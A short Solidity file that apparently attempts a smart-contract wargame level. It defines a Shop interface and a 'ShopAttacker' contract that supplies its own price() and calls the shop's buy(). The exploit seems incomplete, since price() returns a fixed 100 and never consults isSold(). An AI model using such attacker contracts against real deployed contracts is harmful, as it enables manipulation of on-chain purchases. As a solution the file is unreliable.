interface Shop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}


contract ShopAttacker {
    Shop shop;

    uint256 public targetPrice = 100;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint256) {
        return targetPrice;
    }

    function attack() external {
        shop.buy();
    }
} 